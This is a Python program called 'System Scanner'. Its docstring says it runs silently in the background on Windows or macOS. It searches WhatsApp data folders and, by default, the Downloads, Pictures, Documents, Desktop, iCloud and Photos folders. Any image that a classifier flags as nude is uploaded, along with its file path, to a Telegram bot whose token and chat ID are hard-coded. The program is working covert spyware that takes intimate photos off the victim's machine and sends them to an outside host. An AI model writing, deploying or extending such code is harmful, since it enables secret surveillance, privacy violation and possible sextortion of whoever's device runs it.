#!/usr/bin/env python3
"""
System Scanner

This application monitors WhatsApp images and common folders and forwards relevant content to a Telegram bot.
It is designed to run silently in the background and works on both Windows and macOS.

Usage:
    python main.py [--help] [--verbose] [--scan-all] [--background]

Options:
    --help      Show this help message and exit
    --verbose   Run with verbose output (not silent)
    --scan-all  Scan all common folders (Downloads, Pictures, Documents, Desktop) in addition to WhatsApp folders
    --background Run in background with system tray icon
"""

import os
import sys
import time
import argparse
import platform
import logging
import requests
from datetime import datetime
import json
from pathlib import Path
import mimetypes
import threading
from PIL import Image
import base64
import getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pystray
from PIL import Image as PilImage
import signal
import atexit
import subprocess

# Global flag for graceful shutdown
shutdown_flag = threading.Event()

# Set up logging first
log_file = "system_scanner.log.encrypted"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SystemScanner")

# Try to import Windows-specific modules
WINDOWS_SUPPORT = False
try:
    import win32gui
    import win32con
    import win32process
    import win32api
    WINDOWS_SUPPORT = True
    logger.info("Windows-specific features loaded successfully")
except ImportError as e:
    logger.warning(f"Windows-specific features not available. Will use basic functionality. Error: {e}")

# Encryption class for log files
class LogEncryption:
    """Handles encryption and decryption of log files"""
    
    def __init__(self, password=None, salt=None):
        """Initialize the encryption with a password and salt"""
        # Use a default password if none provided (not recommended for production)
        if password is None:
            # Try to get computer name as a simple default
            try:
                password = platform.node().encode()
            except:
                password = b"default_password"
        elif isinstance(password, str):
            password = password.encode()
            
        # Use a default salt if none provided
        if salt is None:
            salt = b"WhatsAppNSFWScanner"  # Fixed salt (consider using a random salt in production)
        elif isinstance(salt, str):
            salt = salt.encode()
            
        # Generate a key from the password
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        self.cipher = Fernet(key)
        
    def encrypt(self, data):
        """Encrypt the data"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, data):
        """Decrypt the data"""
        return self.cipher.decrypt(data).decode()
    
    def encrypt_file(self, input_file, output_file=None):
        """Encrypt a file"""
        if output_file is None:
            output_file = input_file + ".encrypted"
            
        with open(input_file, 'rb') as f:
            data = f.read()
            
        encrypted_data = self.encrypt(data)
        
        with open(output_file, 'wb') as f:
            f.write(encrypted_data)
            
        return output_file
    
    def decrypt_file(self, input_file, output_file=None):
        """Decrypt a file"""
        if output_file is None:
            # Remove .encrypted extension if present
            if input_file.endswith('.encrypted'):
                output_file = input_file[:-10]
            else:
                output_file = input_file + ".decrypted"
                
        with open(input_file, 'rb') as f:
            encrypted_data = f.read()
            
        decrypted_data = self.decrypt(encrypted_data)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(decrypted_data)
            
        return output_file

# Custom log handler for encrypted logs
class EncryptedFileHandler(logging.FileHandler):
    """A file handler that encrypts log records"""
    
    def __init__(self, filename, mode='a', encoding=None, delay=False, password=None, salt=None):
        super().__init__(filename, mode, encoding, delay)
        self.encryptor = LogEncryption(password, salt)
        self.buffer = []
        
    def emit(self, record):
        """Emit a record with encryption"""
        try:
            msg = self.format(record)
            self.buffer.append(msg)
            
            # Write to a temporary file
            temp_file = self.baseFilename + ".temp"
            with open(temp_file, 'w', encoding='utf-8') as f:
                for line in self.buffer:
                    f.write(line + '\n')
                    
            # Encrypt the temporary file
            self.encryptor.encrypt_file(temp_file, self.baseFilename)
            
            # Remove the temporary file
            try:
                os.remove(temp_file)
            except:
                pass
                
        except Exception:
            self.handleError(record)

# Telegram configuration
TELEGRAM_CHAT_ID = "7245887050"  # Updated to your real user chat ID
TELEGRAM_BOT_TOKEN = "8019709115:AAFcCZeoiI8Lp9pTaHP0m_Pc0myRpTYtcMU"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# Content detection threshold (0.0 to 1.0)
DETECTION_THRESHOLD = 0.7

class SystemScanner:
    """Main scanner class for detecting inappropriate content in WhatsApp images and common folders"""
    
    def __init__(self, verbose=False, scan_all=False):
        """Initialize the scanner with platform-specific settings"""
        self.verbose = verbose
        self.scan_all = scan_all
        self.system = platform.system()
        self.whatsapp_folders = self._get_whatsapp_folders()
        self.common_folders = self._get_common_folders() if scan_all else []
        self.processed_images = set()
        self.encryptor = LogEncryption()  # Create encryptor instance
        self.load_processed_images()
        self.detection_model = None
        self.flagged_images_found = 0
        self.running = True  # Add running flag for graceful shutdown
        
        # Silence standard output if not verbose
        if not verbose:
            # Only redirect stdout if not running in background mode
            if not hasattr(sys, '_background_mode'):
                sys.stdout = open(os.devnull, 'w')
            
        logger.info(f"Scanner initialized on {self.system} system")
        logger.info(f"WhatsApp folders to scan: {self.whatsapp_folders}")
        if scan_all:
            logger.info(f"Common folders to scan: {self.common_folders}")
            
    def _get_whatsapp_folders(self):
        """Get the default WhatsApp image folders based on the operating system, including Microsoft Store version on Windows"""
        folders = []
        home = Path.home()
        
        if self.system == "Windows":
            # Windows WhatsApp Desktop folders
            appdata_local = home / "AppData" / "Local" / "WhatsApp"
            appdata_roaming = home / "AppData" / "Roaming" / "WhatsApp"
            
            if appdata_local.exists():
                folders.append(appdata_local)
            if appdata_roaming.exists():
                folders.append(appdata_roaming)

            # Microsoft Store WhatsApp path (with dynamic package ID)
            packages_dir = home / "AppData" / "Local" / "Packages"
            if packages_dir.exists():
                for package_dir in packages_dir.glob("*.WhatsAppDesktop_*"):
                    whatsapp_store_path = package_dir / "LocalState"
                    if whatsapp_store_path.exists():
                        folders.append(whatsapp_store_path)
                        logger.info(f"Found Microsoft Store WhatsApp at: {whatsapp_store_path}")
            
            # Add Downloads folder as WhatsApp Web often saves there
            downloads = home / "Downloads"
            if downloads.exists():
                folders.append(downloads)
                
        elif self.system == "Darwin":  # macOS
            # macOS WhatsApp Desktop folder
            library = home / "Library" / "Application Support" / "WhatsApp"
            if library.exists():
                folders.append(library)
                
            # Add Downloads folder as WhatsApp Web often saves there
            downloads = home / "Downloads"
            if downloads.exists():
                folders.append(downloads)
        
        return folders
    
    def _get_common_folders(self):
        """Get common folders where images might be stored"""
        folders = []
        home = Path.home()
        
        # Common folders on both Windows and macOS
        common_folder_names = [
            "Downloads", 
            "Pictures", 
            "Documents", 
            "Desktop", 
            "Videos"
        ]
        
        for folder_name in common_folder_names:
            folder_path = home / folder_name
            if folder_path.exists():
                folders.append(folder_path)
                
        # Windows-specific folders
        if self.system == "Windows":
            # OneDrive Pictures
            onedrive_pictures = home / "OneDrive" / "Pictures"
            if onedrive_pictures.exists():
                folders.append(onedrive_pictures)
                
            # Public Pictures
            public_pictures = Path("C:/Users/Public/Pictures")
            if public_pictures.exists():
                folders.append(public_pictures)
                
        # macOS-specific folders
        elif self.system == "Darwin":
            # iCloud Drive
            icloud_drive = home / "Library" / "Mobile Documents" / "com~apple~CloudDocs"
            if icloud_drive.exists():
                folders.append(icloud_drive)
                
            # Photos Library
            photos_library = home / "Pictures" / "Photos Library.photoslibrary"
            if photos_library.exists():
                folders.append(photos_library)
        
        return folders
    
    def load_processed_images(self):
        """Load the list of already processed images from an encrypted file"""
        try:
            encrypted_file = "processed_images.json.encrypted"
            if os.path.exists(encrypted_file):
                # Decrypt and load the file
                decrypted_data = self.encryptor.decrypt_file(encrypted_file)
                with open(decrypted_data, 'r') as f:
                    self.processed_images = set(json.load(f))
                # Remove temporary decrypted file
                try:
                    os.remove(decrypted_data)
                except:
                    pass
                logger.info(f"Loaded {len(self.processed_images)} processed images from encrypted file")
            else:
                logger.info("No processed images file found. Starting fresh.")
                self.processed_images = set()
        except Exception as e:
            logger.error(f"Error loading processed images: {e}")
            self.processed_images = set()
    
    def save_processed_images(self):
        """Save the list of processed images to an encrypted file"""
        try:
            # First save to a temporary file
            temp_file = "processed_images.temp.json"
            with open(temp_file, 'w') as f:
                json.dump(list(self.processed_images), f)
            
            # Encrypt the temporary file
            encrypted_file = "processed_images.json.encrypted"
            self.encryptor.encrypt_file(temp_file, encrypted_file)
            
            # Remove the temporary file
            try:
                os.remove(temp_file)
            except:
                pass
                
            logger.info(f"Saved {len(self.processed_images)} processed images to encrypted file")
        except Exception as e:
            logger.error(f"Error saving processed images: {e}")
    
    def _is_image_file(self, file_path):
        """Check if a file is an image based on its extension and mimetype"""
        image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext in image_extensions:
            return True
            
        # Double-check with mimetype
        mime_type, _ = mimetypes.guess_type(file_path)
        return mime_type and mime_type.startswith('image/')
    
    def _load_detection_model(self):
        """Load the Hugging Face content detection model if not already loaded"""
        if self.detection_model is None:
            try:
                from transformers import pipeline
                logger.info("Loading Hugging Face content detection model...")
                self.detection_model = pipeline("image-classification", model="Falconsai/nsfw_image_detection")
                logger.info("Content detection model loaded successfully")
            except Exception as e:
                logger.error(f"Failed to load detection model: {e}")
                raise
    
    def detect_inappropriate_content(self, image_path):
        """Detect if an image contains inappropriate content using Hugging Face pipeline"""
        try:
            self._load_detection_model()
            
            # Open image with PIL
            image = Image.open(image_path)
            
            # Predict content probability
            result = self.detection_model(image)
            
            # Extract results
            inappropriate_score = 0
            detection_result = {}
            
            for item in result:
                detection_result[item['label']] = item['score']
                if item['label'] == 'nsfw':
                    inappropriate_score = item['score']
            
            logger.info(f"Content detection for {os.path.basename(image_path)}: {detection_result}")
            return inappropriate_score > DETECTION_THRESHOLD, detection_result
                
        except Exception as e:
            logger.error(f"Error detecting inappropriate content in {image_path}: {e}")
            return False, {"error": str(e)}
    
    def send_to_telegram(self, image_path, detection_result):
        """Send a flagged image to Telegram (send message first, then send image, and check both responses)"""
        try:
            # Prepare message text
            message_text = f"Flagged content detected: {os.path.basename(image_path)}\n"
            message_text += f"Location: {image_path}\n"
            message_text += f"Detection results: {json.dumps(detection_result, indent=2)}"

            # Send message
            params = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message_text
            }
            msg_response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=params)
            if msg_response.status_code != 200:
                logger.error(f"Failed to send message to Telegram: {msg_response.text}")

            # Send image as photo
            with open(image_path, 'rb') as img_file:
                files = {'photo': img_file}
                params = {'chat_id': TELEGRAM_CHAT_ID}
                photo_response = requests.post(f"{TELEGRAM_API_URL}/sendPhoto", data=params, files=files)

            if photo_response.status_code == 200:
                logger.info(f"Successfully sent image to Telegram: {os.path.basename(image_path)}")
                return True
            else:
                logger.error(f"Failed to send image to Telegram: {photo_response.text}")
                return False

        except Exception as e:
            logger.error(f"Error sending image to Telegram: {e}")
            return False
    
    def scan_directory(self, directory):
        """Scan a directory for images and check for inappropriate content (single-threaded fallback for model stability)"""
        logger.info(f"Scanning directory: {directory}")
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Skip if not an image or already processed
                    if not self._is_image_file(file_path) or file_path in self.processed_images:
                        continue
                    logger.info(f"Checking image: {file_path}")
                    is_flagged, detection_result = self.detect_inappropriate_content(file_path)
                    self.processed_images.add(file_path)
                    if is_flagged:
                        logger.warning(f"Inappropriate content detected in {file_path}")
                        self.send_to_telegram(file_path, detection_result)
                        self.flagged_images_found += 1
        except Exception as e:
            logger.error(f"Error scanning directory {directory}: {e}")
    
    def run(self):
        """Main scanning loop with improved background support"""
        logger.info("Starting continuous scanning...")
        
        # Load detection model
        self._load_detection_model()
        
        scan_count = 0
        last_save_time = time.time()
        
        try:
            while self.running and not shutdown_flag.is_set():
                try:
                    scan_count += 1
                    logger.info(f"Starting scan #{scan_count}")
                    
                    # Scan WhatsApp folders
                    for folder in self.whatsapp_folders:
                        if not self.running or shutdown_flag.is_set():
                            break
                        if os.path.exists(folder):
                            logger.info(f"Scanning WhatsApp folder: {folder}")
                            self.scan_directory(folder)
                        else:
                            logger.warning(f"WhatsApp folder not found: {folder}")
                    
                    # Scan common folders if enabled
                    if self.scan_all:
                        for folder in self.common_folders:
                            if not self.running or shutdown_flag.is_set():
                                break
                            if os.path.exists(folder):
                                logger.info(f"Scanning common folder: {folder}")
                                self.scan_directory(folder)
                            else:
                                logger.warning(f"Common folder not found: {folder}")
                    
                    # Save processed images periodically (every 5 minutes)
                    current_time = time.time()
                    if current_time - last_save_time > 300:  # 5 minutes
                        self.save_processed_images()
                        last_save_time = current_time
                    
                    logger.info(f"Scan #{scan_count} completed. Total flagged images found: {self.flagged_images_found}")
                    
                    # Wait before next scan (check shutdown flag more frequently)
                    for _ in range(30):  # 30 seconds total, check every second
                        if shutdown_flag.is_set() or not self.running:
                            break
                        time.sleep(1)
                        
                except Exception as e:
                    logger.error(f"Error during scan #{scan_count}: {e}")
                    # Wait a bit before retrying
                    for _ in range(10):  # 10 seconds
                        if shutdown_flag.is_set() or not self.running:
                            break
                        time.sleep(1)
                    
        except KeyboardInterrupt:
            logger.info("Scanning interrupted by user")
        finally:
            logger.info("Saving processed images before exit...")
            self.save_processed_images()
            logger.info("Scanner stopped")
    
    def stop(self):
        """Stop the scanner gracefully"""
        logger.info("Stopping scanner...")
        self.running = False

def create_system_tray(scanner):
    """Create system tray icon with menu"""
    try:
        # Create a more visible icon
        icon_size = (64, 64)
        icon_image = PilImage.new('RGB', icon_size, color='blue')
        
        # Draw a border to make it more visible
        for i in range(3):
            for j in range(icon_size[0]):
                icon_image.putpixel((j, i), (255, 255, 255))
                icon_image.putpixel((j, icon_size[1]-1-i), (255, 255, 255))
                icon_image.putpixel((i, j), (255, 255, 255))
                icon_image.putpixel((icon_size[0]-1-i, j), (255, 255, 255))
        
        def on_exit(icon):
            logger.info("User requested exit through system tray")
            shutdown_flag.set()
            scanner.stop()
            icon.stop()
            # Force exit after a short delay
            threading.Timer(2.0, lambda: os._exit(0)).start()
        
        def on_show_status(icon):
            try:
                status_msg = f"System Scanner Status:\nFlagged Images Found: {scanner.flagged_images_found}\nScanning Active: {'Yes' if scanner.running else 'No'}"
                if WINDOWS_SUPPORT:
                    try:
                        win32gui.MessageBox(
                            None,
                            status_msg,
                            "System Scanner Status",
                            win32con.MB_OK | win32con.MB_ICONINFORMATION
                        )
                    except Exception as e:
                        logger.error(f"Error showing Windows message box: {e}")
                        # Fallback to console output
                        print(status_msg)
                else:
                    # Fallback for non-Windows systems or when win32gui is not available
                    logger.info(f"Status: {status_msg}")
                    print(status_msg)
            except Exception as e:
                logger.error(f"Error showing status: {e}")
        
        def on_restart_scan(icon):
            """Restart the scanning process"""
            try:
                logger.info("Restarting scan requested by user")
                if not scanner.running:
                    scanner.running = True
                    # Start a new scanner thread
                    scanner_thread = threading.Thread(target=scanner.run, daemon=True)
                    scanner_thread.start()
                    logger.info("Scanner restarted successfully")
                else:
                    logger.info("Scanner is already running")
            except Exception as e:
                logger.error(f"Error restarting scanner: {e}")
        
        def on_pause_resume(icon):
            """Pause or resume scanning"""
            try:
                if scanner.running:
                    scanner.stop()
                    logger.info("Scanner paused by user")
                else:
                    scanner.running = True
                    scanner_thread = threading.Thread(target=scanner.run, daemon=True)
                    scanner_thread.start()
                    logger.info("Scanner resumed by user")
            except Exception as e:
                logger.error(f"Error pausing/resuming scanner: {e}")
        
        # Create the menu with more options
        menu = (
            pystray.MenuItem("Show Status", on_show_status),
            pystray.MenuItem("Pause/Resume", on_pause_resume),
            pystray.MenuItem("Restart Scan", on_restart_scan),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Exit", on_exit)
        )
        
        # Create the icon
        icon = pystray.Icon(
            "system_scanner",
            icon_image,
            "System Scanner (Running)",
            menu
        )
        
        return icon
        
    except Exception as e:
        logger.error(f"Error creating system tray icon: {e}")
        raise

def signal_handler(signum, frame):
    """Handle system signals for graceful shutdown"""
    logger.info(f"Received signal {signum}, shutting down gracefully...")
    shutdown_flag.set()
    sys.exit(0)

def setup_signal_handlers():
    """Setup signal handlers for graceful shutdown"""
    try:
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        if hasattr(signal, 'SIGBREAK'):  # Windows
            signal.signal(signal.SIGBREAK, signal_handler)
        logger.info("Signal handlers setup successfully")
    except Exception as e:
        logger.warning(f"Could not setup all signal handlers: {e}")

def run_in_background(scan_all=True):
    """Run the scanner in a background thread with system tray support"""
    try:
        logger.info("Starting background mode...")
        
        # Mark that we're running in background mode
        sys._background_mode = True
        
        # Setup signal handlers
        setup_signal_handlers()
        
        # Initialize scanner
        scanner = SystemScanner(verbose=False, scan_all=scan_all)
        
        # Create and start the scanner thread
        scanner_thread = threading.Thread(target=scanner.run, daemon=True)
        scanner_thread.start()
        logger.info("Scanner thread started successfully")
        
        # Create and run system tray icon
        try:
            icon = create_system_tray(scanner)
            logger.info("System tray icon created successfully")
            
            # Setup cleanup on exit
            def cleanup():
                logger.info("Cleaning up before exit...")
                shutdown_flag.set()
                scanner.stop()
                try:
                    icon.stop()
                except:
                    pass
            
            atexit.register(cleanup)
            
            # Run the system tray (this blocks until exit)
            icon.run()
            
        except Exception as e:
            logger.error(f"Failed to create or run system tray icon: {e}")
            # If system tray fails, run without it
            logger.info("Running without system tray...")
            try:
                while not shutdown_flag.is_set():
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("Background process interrupted")
            
    except Exception as e:
        logger.error(f"Error in background mode: {e}")
        raise
    finally:
        logger.info("Background mode shutting down...")
        shutdown_flag.set()

def main():
    """Main entry point for the application"""
    try:
        parser = argparse.ArgumentParser(description="System Scanner")
        parser.add_argument("--verbose", action="store_true", help="Run with verbose output (not silent)")
        parser.add_argument("--scan-all", action="store_true", default=True, help="Scan all common folders in addition to WhatsApp folders")
        parser.add_argument("--encrypt-logs", action="store_true", help="Encrypt log files for privacy")
        parser.add_argument("--decrypt-logs", action="store_true", help="Decrypt existing encrypted log files")
        parser.add_argument("--password", type=str, help="Password for log encryption/decryption (optional)")
        parser.add_argument("--background", action="store_true", help="Run in background with system tray icon")
        args = parser.parse_args()
        
        # Configure logging based on verbose flag
        log_level = logging.DEBUG if args.verbose else logging.INFO
        for handler in logging.root.handlers[:]:
            handler.setLevel(log_level)
        
        # Handle log decryption if requested
        if args.decrypt_logs:
            try:
                password = args.password
                if password is None:
                    password = getpass.getpass("Enter decryption password: ")
                    
                encryptor = LogEncryption(password=password)
                log_file = "system_scanner.log.encrypted"
                decrypted_file = log_file[:-10]  # Remove .encrypted extension
                
                print(f"Decrypting {log_file} to {decrypted_file}...")
                encryptor.decrypt_file(log_file, decrypted_file)
                print(f"Log file decrypted successfully to {decrypted_file}")
                return
            except Exception as e:
                logger.error(f"Error decrypting log file: {e}")
                sys.exit(1)
        
        try:
            if args.background:
                logger.info("Starting in background mode...")
                run_in_background(scan_all=args.scan_all)
            else:
                scanner = SystemScanner(verbose=args.verbose, scan_all=args.scan_all)
                scanner.run()
        except Exception as e:
            logger.error(f"Error during execution: {e}")
            raise
            
    except KeyboardInterrupt:
        logger.info("Scanner stopped by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        if args.verbose:
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()
